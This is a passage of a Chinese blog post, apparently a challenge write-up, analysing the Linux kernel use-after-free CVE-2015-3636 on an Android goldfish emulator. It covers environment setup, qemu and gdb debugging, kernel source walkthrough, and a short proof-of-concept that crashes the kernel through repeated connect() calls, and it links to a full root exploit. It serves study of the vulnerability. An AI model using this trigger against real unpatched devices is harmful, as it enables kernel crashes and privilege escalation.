<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="18年暑假在icsl实习，师父给我安排了这个漏洞的分析任务。当年还不知道libc为何物的我，竟然硬着头皮看起了linux内核漏洞利用，而且不知道哪儿来的自信觉得自己完全看懂了，还在最终答辩时讲给评委们听，实在是惭愧😂。一眨眼四年过去了，在技术的道路上比当年终于长进了一点点，回头分析一遍，给当年的任务画个句号~">
<meta property="og:type" content="article">
<meta property="og:title" content="一步一步利用CVE-2015-3636">
<meta property="og:url" content="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/index.html">
<meta property="og:site_name" content="blingbling&#39;s blog">
<meta property="og:description" content="18年暑假在icsl实习，师父给我安排了这个漏洞的分析任务。当年还不知道libc为何物的我，竟然硬着头皮看起了linux内核漏洞利用，而且不知道哪儿来的自信觉得自己完全看懂了，还在最终答辩时讲给评委们听，实在是惭愧😂。一眨眼四年过去了，在技术的道路上比当年终于长进了一点点，回头分析一遍，给当年的任务画个句号~">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/image-20220724205457823.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/image-20220724205518889.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/image-20220724134020649.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/image-20220918180540313.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/image-20220918193452306.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/image-20220918200706532.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/image-20220920175812155.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/image-20220920182949779.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/image-20220921123726416.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/image-20220919162607272.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/image-20220724182224254.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/image-20220921230829799.png?size=600">
<meta property="article:published_time" content="2022-09-21T08:50:29.000Z">
<meta property="article:modified_time" content="2022-09-23T15:54:20.433Z">
<meta property="article:author" content="blingbling">
<meta property="article:tag" content="socket">
<meta property="article:tag" content="android">
<meta property="article:tag" content="goldfish">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/image-20220724205457823.png?size=600"><title>一步一步利用CVE-2015-3636 | blingbling's blog</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":3},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"simple","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: undefined,
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">关于</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">blingbling's blog</div><div class="header-banner-info__subtitle">Clang鱼塘</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">一步一步利用CVE-2015-3636</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-09-21</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-09-23</span></span></div></header><div class="post-body"><p>CVE-2015-3636漏洞的杀伤力巨大，能够root当时大多数的android手机（<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://keenlab.tencent.com/zh/2016/05/25/CVEs-in-KeenLab/" >这些年, 我们虐过的漏洞by 腾讯科恩实验室</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>）。科恩团队利用改进过的fuzz工具 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/kernelslacker/trinity" >Trinity</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 发现了该漏洞，并在blackhat 2015通过议题 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back-wp.pdf" >Own your Android! Yet Another Universal Root</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 详细讲述了该漏洞的利用方法。</p>
<p>该漏洞发生在内核网络协议栈网络层的实现中（ping_unhash()），client端向服务器端发起连接（connect()函数）操作时，未考虑到hlist_nulls_node节点删除的特殊性（node-&gt;pprev不为null，而是LIST_POISON2），从而导致了UAF漏洞。</p>
<p>被free的对象是<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.10/source/include/linux/net.h#L104" >struct socket</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中的struct sock *sk，<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.10/source/include/net/sock.h#L285" >sock结构体</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中有许多函数指针。因此通过physmap spray覆盖某个函数指针，来达到任意代码执行的目的，进而获取root shell。</p>

        <h1 id="环境准备"   >
          <a href="#环境准备" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1>
      <p>根据<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-480759-1-1.html" >吾爱破解2016安全挑战赛</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中给出的漏洞环境，准备如下两个镜像：</p>
<ul>
<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mirrors.aliyun.com/ubuntu-releases/14.04/ubuntu-14.04.6-desktop-amd64.iso?spm=a2c6h.25603864.0.0.10af5192cdIhXU" >ubuntu14.04镜像</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://down.52pojie.cn/Challenge/2016_Security_Challenge/android-problem-env.7z" >goldfish镜像及对应emulator</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> - 解压密码：63BBC624A1238F6434B37EEAA4535D6C</p>
</li>
</ul>
<p>该题中linux内核的版本是3.10，下载源码辅助分析：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/torvalds/linux/tree/v3.10-rc1" >linux v3.10-rc1版本源码</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>分析之前，先用别人的poc和exp打一遍，确认环境和利用脚本都没问题。</p>

        <h2 id="测试poc"   >
          <a href="#测试poc" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试poc" class="headerlink" title="测试poc"></a>测试poc</h2>
      <blockquote>
<p>poc部分仅仅体现了访问非法地址导致的崩溃，真正的利用需要绕过崩溃点，触发UAF，然后在关闭socket时劫持控制流</p>
</blockquote>
<p><a href="poc.zip">poc代码-ndk编译</a> ，main函数代码如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">sa.sin_family = AF_INET;</span><br><span class="line">connect(sock, (<span class="keyword">const</span> struct sockaddr *) &amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line"></span><br><span class="line">sa.sin_family = AF_UNSPEC;</span><br><span class="line">connect(sock, (<span class="keyword">const</span> struct sockaddr *) &amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">connect(sock, (<span class="keyword">const</span> struct sockaddr *) &amp;sa, <span class="keyword">sizeof</span>(sa));</span><br></pre></td></tr></table></div></figure>
<p>执行poc后，kernel panic，显示<code>Unable to handle kernel paging request at virtual address 00001360</code>，为什么不是0x200200呢？这是因为出题人对这个值做了修改，利用IDA逆向Image文件，在<code>sub_FFFFFFC000409614()</code>函数中可以看到0x1360这个值。</p>
<p><img   src="image-20220724205457823.png?size=600" style="width: 600px;"  alt="image-20220724205457823"></p>
<p><img   src="image-20220724205518889.png?size=600" style="width: 600px;"  alt="image-20220724205518889"></p>

        <h2 id="测试exp"   >
          <a href="#测试exp" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试exp" class="headerlink" title="测试exp"></a>测试exp</h2>
      <blockquote>
<p>比较复杂，在漏洞利用小节详细分析</p>
</blockquote>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/4B5F5F4B/Exploits/tree/master/Linux/CVE-2015-3636/jni" >看雪2016挑战赛exp.by.4B5F5F4B</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ndk编译后能成功执行</p>
<p><img   src="image-20220724134020649.png?size=600" style="width: 600px;"  alt="image-20220724134020649"></p>
<blockquote>
<p>LQ：aarch64-gnu-linux-gcc 静态编译和ndk编译的结果不一样（1. 对头文件的依赖；2. system无法执行成功 ；3. mmap操作不一样）【最终有没有可能采用静态编译的方式利用成功？】</p>
</blockquote>

        <h2 id="如何调试"   >
          <a href="#如何调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h2>
      <blockquote>
<p>题目给的启动程序做了些封装操作，为了获得最原始的qemu启动命令，需在程序启动后查看进程信息，截取启动命令</p>
</blockquote>
<p><code>./startEmulator</code>启动虚拟机后，通过<code>ps -ef</code>查看进程情况，得知最终是通过qemu-system-aarch64（是谷歌的android-qemu）来启动的。我们需要利用它的启动参数来调试。</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bling     19263   2450  0 21:19 pts&#x2F;1    00:00:00 &#x2F;bin&#x2F;bash .&#x2F;startEmulator</span><br><span class="line">bling     19264  19263 98 21:19 pts&#x2F;1    00:00:09 .&#x2F;qemu&#x2F;linux-x86_64&#x2F;qemu-system-aarch64 -cpu cortex-a57 -machine type&#x3D;ranchu -m 1024 -append console&#x3D;ttyAMA0,38400 keep_bootcon earlyprintk&#x3D;ttyAMA0 -serial mon:stdio -kernel .&#x2F;Image -initrd...</span><br></pre></td></tr></table></div></figure>
<p>由于启动命令较长，terminal无法完全显示命令。我们可以利用cmdline获取该命令，如下：</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/&lt;PID&gt;/cmdline | xargs -0 echo</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者</span></span><br><span class="line">python3 -c &quot;print(open(&#x27;/proc/8716/cmdline&#x27;,&#x27;rb&#x27;).read().replace(b&#x27;\x00&#x27;,b&#x27; &#x27;))&quot;</span><br></pre></td></tr></table></div></figure>
<p>得到如下启动命令</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu/linux-x86_64/qemu-system-aarch64 -cpu cortex-a57 -machine type=ranchu -m 1024 -append &#x27;console=ttyAMA0,38400 keep_bootcon earlyprintk=ttyAMA0&#x27; -serial mon:stdio -kernel ./Image -initrd ./ramdisk.img -drive index=0,id=sdcard,file=./system.img -device virtio-blk-device,drive=sdcard -drive index=1,id=userdata,file=././userdata.img -device virtio-blk-device,drive=userdata -drive index=2,id=cache,file=./cache.img -device virtio-blk-device,drive=cache -drive index=3,id=system,file=./system.img -device virtio-blk-device,drive=system -netdev user,id=mynet -device virtio-net-device,netdev=mynet -show-cursor -nographic -L lib/pc-bios</span><br></pre></td></tr></table></div></figure>
<p>调试的话，在以上命令后加上<code>-S -s</code>（gdbserver默认监听本地1234端口），然后另起一个terminal，执行<code>gdb-multiarch</code></p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gdb-multiarch</span></span><br><span class="line"><span class="meta">gdb&gt;</span><span class="bash"> <span class="built_in">set</span> architecture aarch64</span></span><br><span class="line"><span class="meta">gdb&gt;</span><span class="bash"> target remote :1234</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果用gef调试的话，必须用命令：gef-remote -q localhost:1234</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 否则会报错- Command <span class="string">&#x27;context&#x27;</span> failed to execute properly, reason: <span class="string">&#x27;NoneType&#x27;</span> object has no attribute <span class="string">&#x27;all_registers&#x27;</span></span></span><br><span class="line"><span class="meta">gdb&gt;</span><span class="bash"> c</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

        <h1 id="漏洞分析"   >
          <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>
      <blockquote>
<p>该漏洞发生在内核网络协议栈网络层的实现中（ping_unhash()），client端向服务器端发起连接（connect()函数）操作时，未考虑到hlist_nulls_node节点删除的特殊性（node-&gt;pprev不为null，而是LIST_POISON2），从而导致了UAF漏洞。</p>
<p>被free的对象是<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.10/source/include/linux/net.h#L104" >struct socket</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中的struct sock *sk，<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.10/source/include/net/sock.h#L285" >sock结构体</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中有许多函数指针。因此通过physmap spray覆盖某个函数指针，来达到任意代码执行的目的，进而获取root shell。</p>
</blockquote>
<p>了解linux内核网络协议栈参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/jmilkfan-fanguiju/p/12789808.html" >计算机网络基础 — Linux 内核网络协议栈</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>根据poc崩溃现场打印的log来看，调用流程是这样的：Sys_connect() –&gt; inet_dgram_connect() –&gt; udp_disconnect() –&gt; ping_unhash()。跟着源码分析，inet_dgram_connect()函数定义如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_dgram_connect</span><span class="params">(struct socket *sock, struct sockaddr *uaddr,</span></span></span><br><span class="line"><span class="function"><span class="params">		       <span class="keyword">int</span> addr_len, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (addr_len &lt; <span class="keyword">sizeof</span>(uaddr-&gt;sa_family))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (uaddr-&gt;sa_family == AF_UNSPEC)</span><br><span class="line">		<span class="keyword">return</span> sk-&gt;sk_prot-&gt;disconnect(sk, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!inet_sk(sk)-&gt;inet_num &amp;&amp; inet_autobind(sk))</span><br><span class="line">		<span class="keyword">return</span> -EAGAIN;</span><br><span class="line">	<span class="keyword">return</span> sk-&gt;sk_prot-&gt;connect(sk, uaddr, addr_len);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(inet_dgram_connect);</span><br></pre></td></tr></table></div></figure>
<p>漏洞分支是<code>if (uaddr-&gt;sa_family == AF_UNSPEC)</code>，而sk-&gt;sk_prot-&gt;disconnect对应的函数是谁呢？</p>
<blockquote>
<p>inet_init()中根据实际场景将某个<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/af_inet.c#L1030" >struct inet_protosw inetsw_array</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>关联到inetsw，再在inet_create()函数中初始化sk-&gt;sk_prot为对应的<code>.prot</code>。本题对应<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/af_inet.c#L1051" >IPPPROTO_ICMP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>这一结构，如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_protosw</span> <span class="title">inetsw_array</span>[] =</span></span><br><span class="line">&#123;</span><br><span class="line">       &#123;</span><br><span class="line">		.type =       SOCK_DGRAM,</span><br><span class="line">		.protocol =   IPPROTO_ICMP,</span><br><span class="line">		.prot =       &amp;ping_prot,</span><br><span class="line">		.ops =        &amp;inet_dgram_ops,</span><br><span class="line">		.no_check =   UDP_CSUM_DEFAULT,</span><br><span class="line">		.flags =      INET_PROTOSW_REUSE,</span><br><span class="line">       &#125;,</span><br></pre></td></tr></table></div></figure>
<p>因此，sk-&gt;sk_prot-&gt;disconnect中的disconnect对应<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/ping.c#L727" >struct proto ping_prot</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/udp.c#L1306" >udp_disconnect()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，代码如下：</p>
</blockquote>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">udp_disconnect</span><span class="params">(struct sock *sk, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">inet</span> =</span> inet_sk(sk);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 *	1003.1g - break association.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	sk-&gt;sk_state = TCP_CLOSE;</span><br><span class="line">	inet-&gt;inet_daddr = <span class="number">0</span>;</span><br><span class="line">	inet-&gt;inet_dport = <span class="number">0</span>;</span><br><span class="line">	sock_rps_reset_rxhash(sk);</span><br><span class="line">	sk-&gt;sk_bound_dev_if = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!(sk-&gt;sk_userlocks &amp; SOCK_BINDADDR_LOCK))</span><br><span class="line">		inet_reset_saddr(sk);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(sk-&gt;sk_userlocks &amp; SOCK_BINDPORT_LOCK)) &#123;</span><br><span class="line">		sk-&gt;sk_prot-&gt;unhash(sk);</span><br><span class="line">		inet-&gt;inet_sport = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	sk_dst_reset(sk);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(udp_disconnect);</span><br></pre></td></tr></table></div></figure>
<p>如果当前未绑定端口，则进入<code>if (!(sk-&gt;sk_userlocks &amp; SOCK_BINDPORT_LOCK))</code>分支，调用<code>sk-&gt;sk_prot-&gt;unhash(sk)</code>，对应<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.10/source/net/ipv4/ping.c#L135" >ping_v4_unhash()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>函数（函数名跟题目Image中的不一样），函数定义如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ping_v4_unhash</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">isk</span> =</span> inet_sk(sk);</span><br><span class="line">	pr_debug(<span class="string">&quot;ping_v4_unhash(isk=%p,isk-&gt;num=%u)\n&quot;</span>, isk, isk-&gt;inet_num);</span><br><span class="line">	<span class="keyword">if</span> (sk_hashed(sk)) &#123;</span><br><span class="line">		write_lock_bh(&amp;ping_table.lock);</span><br><span class="line">		hlist_nulls_del(&amp;sk-&gt;sk_nulls_node);</span><br><span class="line">		sock_put(sk);</span><br><span class="line">		isk-&gt;inet_num = <span class="number">0</span>;</span><br><span class="line">		isk-&gt;inet_sport = <span class="number">0</span>;</span><br><span class="line">		sock_prot_inuse_add(sock_net(sk), sk-&gt;sk_prot, <span class="number">-1</span>);</span><br><span class="line">		write_unlock_bh(&amp;ping_table.lock);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>if分支的判断条件是<code>sk_hashed(sk)</code>，简言之，如果<code>sk-&gt;sk_node-&gt;pprev</code>非0，就进入if分支。下面看看if分支里的<code>hlist_nulls_del()</code>函数，将<code>sk-&gt;sk_nulls_node</code>从链表节点中删除，并将<code>sk-&gt;sk_nulls_node-&gt;pprev</code>设置为<code>LIST_POISON2</code>（0x200200，本题环境中为0x1360）。</p>
<p><code>sk-&gt;sk_nulls_node</code>即<code>sk-&gt;sk_node</code>，它俩是一个union。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> POISON_POINTER_DELTA 0</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * These are non-NULL pointers that will result in page faults</span></span><br><span class="line"><span class="comment"> * under normal circumstances, used to verify that nobody uses</span></span><br><span class="line"><span class="comment"> * non-initialized list entries.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIST_POISON1  ((void *) 0x00100100 + POISON_POINTER_DELTA)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIST_POISON2  ((void *) 0x00200200 + POISON_POINTER_DELTA)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">hlist_nulls_del</span><span class="params">(struct hlist_nulls_node *n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__hlist_nulls_del(n);</span><br><span class="line">	n-&gt;pprev = LIST_POISON2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __hlist_nulls_del(struct 